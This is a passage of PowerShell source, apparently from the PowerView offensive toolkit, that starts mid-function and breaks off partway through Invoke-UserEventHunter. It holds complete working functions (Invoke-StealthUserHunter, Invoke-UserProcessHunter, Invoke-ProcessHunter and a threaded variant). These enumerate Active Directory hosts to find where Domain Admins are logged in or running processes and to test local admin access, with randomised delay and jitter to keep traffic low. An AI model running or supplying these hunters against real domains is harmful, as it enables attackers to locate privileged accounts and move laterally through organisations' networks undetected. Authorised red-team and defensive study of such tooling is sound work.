                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $CurrentUserBase)){
                        # if the session user is in the target list, display some output
                        if ((-not $TargetUsers) -or ($TargetUsers -contains $username)){

                            $ip = Get-HostIP -hostname $Server

                            if($cname.StartsWith("\\")){
                                $cname = $cname.TrimStart("\")
                            }

                            $out = new-object psobject
                            $out | add-member Noteproperty 'TargetUser' $username
                            $out | add-member Noteproperty 'Computer' $server
                            $out | add-member Noteproperty 'IP' $ip
                            $out | add-member Noteproperty 'SessionFrom' $cname

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $cname
                                $out | add-member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | add-member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                    }
                }

                # get any logged on users and see if there's a target user there
                $users = Get-NetLoggedon -HostName $Server
                foreach ($user in $users) {
                    $username = $user.wkui1_username
                    $domain = $user.wkui1_logon_domain

                    if (($username -ne $null) -and ($username.trim() -ne '')){
                        # if the session user is in the target list, display some output
                        if ((-not $TargetUsers) -or ($TargetUsers -contains $username)){

                            $ip = Get-HostIP -hostname $Server

                            $out = new-object psobject
                            $out | add-member Noteproperty 'TargetUser' $username
                            $out | add-member Noteproperty 'Computer' $server
                            $out | add-member Noteproperty 'IP' $ip
                            $out | add-member Noteproperty 'SessionFrom' $Null

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $server
                                $out | add-member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | add-member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                    }
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('TargetUsers', $TargetUsers).AddParameter('CurrentUser', $CurrentUser).AddParameter('CurrentUserBase', $CurrentUserBase)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }

        $pool.Dispose()
    }
}


function Invoke-StealthUserHunter {
    <#
        .SYNOPSIS
        Finds where users are logged into by checking the net sessions
        on common file servers (default) or through SPN records (-SPN).

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function issues one query on the domain to get users of a target group,
        issues one query on the domain to get all user information, extracts the
        homeDirectory for each user, creates a unique list of servers used for
        homeDirectories (i.e. file servers), and runs Get-NetSessions against the target
        servers. Found users are compared against the users queried from the domain group,
        or pulled from a pre-populated user list. Significantly less traffic is generated
        on average compared to Invoke-UserHunter, but not as many hosts are covered.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of servers to enumerate.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER OU
        OU to query for target users.

        .PARAMETER Filter
        The complete LDAP query string to use to query for users.

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER SPN
        Use SPN records to get your target sets.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER CheckAccess
        Check if the current user has local admin access to found machines.

        .PARAMETER StopOnSuccess
        Stop hunting after finding a user.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating fileservers, defaults to 0

        .PARAMETER Jitter
        Jitter for the fileserver delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for users file server locations.

        .PARAMETER ShowAll
        Return all user location results.

        .PARAMETER Source
        The systems to use for session enumeration ("DC","File","All"). Defaults to "all"

        .EXAMPLE
        > Invoke-StealthUserHunter
        Finds machines on the local domain where domain admins have sessions from.

        .EXAMPLE
        > Invoke-StealthUserHunter -Domain testing
        Finds machines on the 'testing' domain where domain admins have sessions from.

        .EXAMPLE
        > Invoke-StealthUserHunter -UserList users.txt
        Finds machines on the local domain where users from a specified list have
        sessions from.

        .EXAMPLE
        > Invoke-StealthUserHunter -CheckAccess
        Finds machines on the local domain where domain admins have sessions from
        and checks if the current user has local administrator access to those
        found machines.

        .EXAMPLE
        > Invoke-StealthUserHunter -GroupName "Power Users" -Delay 60
        Find machines on the domain where members of the "Power Users" groups
        have sessions with a 60 second (+/- *.3) randomized delay between
        touching each file server.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $GroupName = 'Domain Admins',

        [string]
        $OU,

        [string]
        $Filter,

        [string]
        $UserName,

        [Switch]
        $SPN,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $UserList,

        [string]
        $Domain,

        [Switch]
        $ShowAll,

        [string]
        [ValidateSet("DC","File","All")]
        $Source ="All"
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # users we're going to be searching for
        $TargetUsers = @()

        # resulting servers to query
        $Servers = @()

        # random object for delay
        $randNo = New-Object System.Random

        # get the current user
        $CurrentUser = Get-NetCurrentUser
        $CurrentUserBase = ([Environment]::UserName)

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-StealthUserHunter with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're showing all results, skip username enumeration
        if($ShowAll){}
        # if we get a specific username, only use that
        elseif ($UserName){
            Write-Verbose "[*] Using target user '$UserName'..."
            $TargetUsers += $UserName.ToLower()
        }
        # get the users from a particular OU if one is specified
        elseif($OU){
            $TargetUsers = Get-NetUser -OU $OU | ForEach-Object {$_.samaccountname}
        }
        # use a specific LDAP query string to query for users
        elseif($Filter){
            $TargetUsers = Get-NetUser -Filter $Filter | ForEach-Object {$_.samaccountname}
        }
        # read in a target user list if we have one
        elseif($UserList){
            $TargetUsers = @()
            # make sure the list exists
            if (Test-Path -Path $UserList){
                $TargetUsers = Get-Content -Path $UserList
            }
            else {
                Write-Warning "[!] Input file '$UserList' doesn't exist!"
                return
            }
        }
        else{
            # otherwise default to the group name to query for target users
            Write-Verbose "[*] Querying domain group '$GroupName' for target users..."
            $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain | % {$_.MemberName}
            # lower case all of the found usernames
            $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
        }

        if ((-not $ShowAll) -and (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0))){
            Write-Warning "[!] No users found to search for!"
            return $Null
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        elseif($SPN){
            # set the unique set of SPNs from user objects
            $Hosts = Get-NetUserSPNs | Foreach-Object {
                $_.ServicePrincipalName | Foreach-Object {
                    ($_.split("/")[1]).split(":")[0]
                }
            } | Sort-Object -Unique
        }
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {

            if ($Source -eq "File"){
                Write-Verbose "[*] Querying domain $targetDomain for File Servers..."
                [Array]$Hosts = Get-NetFileServers -Domain $targetDomain

            }
            elseif ($Source -eq "DC"){
                Write-Verbose "[*] Querying domain $targetDomain for Domain Controllers..."
                [Array]$Hosts = Get-NetDomainControllers -Domain $targetDomain | % {$_.Name}
            }
            elseif ($Source -eq "All") {
                Write-Verbose "[*] Querying domain $targetDomain for hosts..."
                [Array]$Hosts  = Get-NetFileServers -Domain $targetDomain
                $Hosts += Get-NetDomainControllers -Domain $targetDomain | % {$_.Name}
            }
        }

        # uniquify the host list and then randomize it
        $Hosts = $Hosts | Sort-Object -Unique
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        $counter = 0

        # iterate through each target file server
        foreach ($server in $Hosts){

            $found = $false
            $counter = $counter + 1

            Write-Verbose "[*] Enumerating host $server ($counter of $($Hosts.count))"

            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            # optionally check if the server is up first
            $up = $true
            if(-not $NoPing){
                $up = Test-Server -Server $server
            }
            if ($up){
                # grab all the sessions for this fileserver
                $sessions = Get-NetSessions $server

                # search through all the sessions for a target user
                foreach ($session in $sessions) {
                    Write-Debug "[*] Session: $session"
                    # extract fields we care about
                    $username = $session.sesi10_username
                    $cname = $session.sesi10_cname
                    $activetime = $session.sesi10_time
                    $idletime = $session.sesi10_idle_time

                    # make sure we have a result
                    if (($username -ne $null) -and ($username.trim() -ne '') -and ($username.trim().toLower() -ne $CurrentUserBase)){
                        # if the session user is in the target list, display some output
                        if ($ShowAll -or $($TargetUsers -contains $username)){
                            $found = $true
                            $ip = Get-HostIP -hostname $Server

                            if($cname.StartsWith("\\")){
                                $cname = $cname.TrimStart("\")
                            }

                            $out = new-object psobject
                            $out | add-member Noteproperty 'TargetUser' $username
                            $out | add-member Noteproperty 'Computer' $server
                            $out | add-member Noteproperty 'IP' $ip
                            $out | add-member Noteproperty 'SessionFrom' $cname

                            # see if we're checking to see if we have local admin access on this machine
                            if ($CheckAccess){
                                $admin = Invoke-CheckLocalAdminAccess -Hostname $cname
                                $out | add-member Noteproperty 'LocalAdmin' $admin
                            }
                            else{
                                $out | add-member Noteproperty 'LocalAdmin' $Null
                            }
                            $out
                        }
                    }
                }
            }

            if ($StopOnSuccess -and $found) {
                Write-Verbose "[*] Returning early"
                return
           }
        }
    }
}


function Invoke-UserProcessHunter {
    <#
        .SYNOPSIS
        Query the process lists of remote machines, searching for
        specific user processes.

        Author: @harmj0y
        License: BSD 3-Clause

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER OU
        The OU to pull users from.

        .PARAMETER Filter
        The complete LDAP filter string to use to query for users.

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER RemoteUserName
        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

        .PARAMETER RemotePassword
        The password to use for the WMI call on a remote system.

        .PARAMETER StopOnSuccess
        Stop hunting after finding a process.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain for query for machines.

        .EXAMPLE
        > Invoke-UserProcessHunter -Domain 'testing'
        Finds machines on the 'testing' domain where domain admins have a
        running process.

        .EXAMPLE
        > Invoke-UserProcessHunter -UserList users.txt -HostList hosts.txt
        Finds machines in hosts.txt where any members of users.txt have running
        processes.

        .EXAMPLE
        > Invoke-UserProcessHunter -GroupName "Power Users" -Delay 60
        Find machines on the domain where members of the "Power Users" groups have
        running processes with a 60 second (+/- *.3) randomized delay between
        touching each host.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $GroupName = 'Domain Admins',

        [string]
        $OU,

        [string]
        $Filter,

        [string]
        $UserName,

        [string]
        $RemoteUserName,

        [string]
        $RemotePassword,

        [switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $UserList,

        [string]
        $Domain

    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # users we're going to be searching for
        $TargetUsers = @()

        # random object for delay
        $randNo = New-Object System.Random

        # get the current user
        $CurrentUser = Get-NetCurrentUser
        $CurrentUserBase = ([Environment]::UserName).toLower()

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-UserProcessHunter with a delay of $delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # if we get a specific username, only use that
        if ($UserName){
            $TargetUsers += $UserName.ToLower()
        }
        # get the users from a particular OU if one is specified
        elseif($OU){
            $TargetUsers = Get-NetUser -OU $OU | ForEach-Object {$_.samaccountname}
        }
        # use a specific LDAP query string to query for users
        elseif($Filter){
            $TargetUsers = Get-NetUser -Filter $Filter | ForEach-Object {$_.samaccountname}
        }
        # read in a target user list if we have one
        elseif($UserList){
            $TargetUsers = @()
            # make sure the list exists
            if (Test-Path -Path $UserList){
                $TargetUsers = Get-Content -Path $UserList
            }
            else {
                Write-Warning "[!] Input file '$UserList' doesn't exist!"
                return
            }
        }
        else{
            # otherwise default to the group name to query for target users
            $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain | % {$_.MemberName}
            # lower case all of the found usernames
            $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
        }

        $TargetUsers = $TargetUsers | ForEach-Object {$_.ToLower()}

        if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
            Write-Warning "[!] No users found to search for!"
            return
        }
    }

    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        
        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $HostCount = $Hosts.Count

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            # make sure we get a server name
            if ($server -ne ''){
                $found = $false

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating target $server ($counter of $($Hosts.count))"

                # try to enumerate all active processes on the remote host
                # and see if any target users have a running process
                $processes = Get-NetProcesses -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -HostName $server -ErrorAction SilentlyContinue

                foreach ($process in $processes) {
                    # if the session user is in the target list, display some output
                    if ($TargetUsers -contains $process.User){
                        $found = $true
                        $process
                    }
                }

                if ($StopOnSuccess -and $found) {
                    Write-Verbose "[*] Returning early"
                    return
                }
            }
        }
    }
}


function Invoke-ProcessHunter {
    <#
        .SYNOPSIS
        Query the process lists of remote machines and searches
        the process list for a target process name.

        Author: @harmj0y
        License: BSD 3-Clause

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER ProcessName
        The name of the process to hunt. Defaults to putty.exe

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER RemoteUserName
        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

        .PARAMETER RemotePassword
        The password to use for the WMI call on a remote system.

        .PARAMETER StopOnSuccess
        Stop hunting after finding a process.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain for query for machines.

        .EXAMPLE
        > Invoke-ProcessHunter -ProcessName customlogin.exe

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $ProcessName = "putty",

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $RemoteUserName,

        [string]
        $RemotePassword,

        [switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $Domain
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $randNo = New-Object System.Random

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-ProcessHunter with a delay of $delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
    }

    process {
        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $HostCount = $Hosts.Count
        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            # make sure we get a server name
            if ($server -ne ''){
                $found = $false
                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating target $server ($counter of $($Hosts.count))"

                # try to enumerate all active processes on the remote host
                # and search for a specific process name
                $processes = Get-NetProcesses -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -HostName $server -ErrorAction SilentlyContinue

                foreach ($process in $processes) {
                    # if the session user is in the target list, display some output
                    if ($process.Process -match $ProcessName){
                        $found = $true
                        $process
                    }
                }

                if ($StopOnSuccess -and $found) {
                    Write-Verbose "[*] Returning early"
                    return
                }
            }
        }
    }
}


function Invoke-ProcessHunterThreaded {
    <#
        .SYNOPSIS
        Query the process lists of remote machines and searches
        the process list for a target process name. Uses multithreading 
        to speed up enumeration.

        Author: @harmj0y
        License: BSD 3-Clause

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER ProcessName
        The name of the process to hunt. Defaults to putty.exe

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER RemoteUserName
        The "domain\username" to use for the WMI call on a remote system.
        If supplied, 'RemotePassword' must be supplied as well.

        .PARAMETER RemotePassword
        The password to use for the WMI call on a remote system.

        .PARAMETER StopOnSuccess
        Stop hunting after finding a process.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain for query for machines.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .LINK
        http://blog.harmj0y.net
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $ProcessName = "putty",

        [string]
        $HostList,

        [string]
        $HostFilter,

        [string]
        $RemoteUserName,

        [string]
        $RemotePassword,

        [switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [int]
        $MaxThreads = 20
    )

    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $ProcessName, $RemoteUserName, $RemotePassword)

            # optionally check if the server is up first
            $up = $true
            if($Ping){
                $up = Test-Server -Server $Server
            }
            if($up){

                # try to enumerate all active processes on the remote host
                # and search for a specific process name
                $processes = Get-NetProcesses -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -HostName $server -ErrorAction SilentlyContinue

                foreach ($process in $processes) {
                    # if the session user is in the target list, display some output
                    if ($process.Process -match $ProcessName){
                        $found = $true
                        $process
                    }
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('ProcessName', $ProcessName).AddParameter('RemoteUserName', $RemoteUserName).AddParameter('RemotePassword', $RemotePassword)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {

        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }
        $pool.Dispose()
    }
}


function Invoke-UserEventHunter {
    <#
        .SYNOPSIS
        Queries all domain controllers on the network for account
        logon events (ID 4624) and TGT request events (ID 4768),
        searching for target users.

        Note: Domain Admin (or equiv) rights are needed to query
        this information from the DCs.

        Author: @sixdub, @harmj0y
        License: BSD 3-Clause

        .PARAMETER GroupName
        Group name to query for target users.

        .PARAMETER OU
        The OU to pull users from.

        .PARAMETER Filter
        The complete LDAP filter string to use to query for users.

        .PARAMETER UserName
        Specific username to search for.

        .PARAMETER UserList
        List of usernames to search for.

        .PARAMETER Domain
        Domain to query for DCs and users.

        .PARAMETER SearchDays
        Number of days back to search logs for. Default 3.
    #>

    [CmdletBinding()]
    param(
        [string]
        $GroupName = 'Domain Admins',

        [string]
        $OU,

        [string]
        $Filter,

        [string]
        $UserName,

        [string]
        $UserList,

        [string]
        $Domain,

        [int32]
        $SearchDays = 3
    )

    if ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }

    # users we're going to be searching for
    $TargetUsers = @()

    # if we get a specific username, only use that
    if ($UserName){
        $TargetUsers += $UserName.ToLower()
    }
    # get the users from a particular OU/filter string if one is specified
    elseif($OU -or $Filter){
        $TargetUsers = Get-NetUser -Filter $Filter -OU $OU -Domain $Domain | ForEach-Object {$_.samaccountname}
    }
    # read in a target user list if we have one
    elseif($UserList){
        $TargetUsers = @()
        # make sure the list exists
        if (Test-Path -Path $UserList){
            $TargetUsers = Get-Content -Path $UserList
        }
        else {
            Write-Warning "[!] Input file '$UserList' doesn't exist!"
            return
        }
    }
    else{
        # otherwise default to the group name to query for target users
        $temp = Get-NetGroup -GroupName $GroupName -Domain $Domain | % {$_.MemberName}
        # lower case all of the found usernames
        $TargetUsers = $temp | ForEach-Object {$_.ToLower() }
    }

    $TargetUsers = $TargetUsers | ForEach-Object {$_.ToLower()}

    if (($TargetUsers -eq $null) -or ($TargetUsers.Count -eq 0)){
